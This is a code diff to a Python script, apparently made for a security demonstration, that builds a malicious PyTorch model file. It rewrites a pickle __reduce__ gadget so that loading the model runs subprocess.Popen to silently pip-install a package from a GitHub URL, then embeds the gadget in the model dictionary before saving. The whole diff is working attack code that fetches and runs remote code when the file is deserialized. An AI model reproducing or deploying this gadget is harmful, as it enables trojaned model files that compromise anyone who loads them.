@@ -1,12 +1,15 @@
+import pydoc
+import subprocess
 import venv
 
 import torch
 
 
-class VenvExploit:
+
+class Exploit:
     def __reduce__(self):
-        return venv.main, (
-           ['exploit', '--upgrade', '--upgrade-deps'],
+        return subprocess.Popen, (
+            '','python -m pip install git+https://github.com/madgetr/rsac-demo-package  -q -q -q --no-input --exists-action i --isolated',
         ), None, None, None
 
 def make_infected_model():
@@ -14,7 +17,7 @@ def make_infected_model():
     malicious_model = torch.load("pytorch_model.bin")
 
     # Add the malicious class to the end of the model
-    malicious_model["create_venv"] = VenvExploit()
+    malicious_model["exploit"] = Exploit()
 
 
     # Save the malicious model as a new file
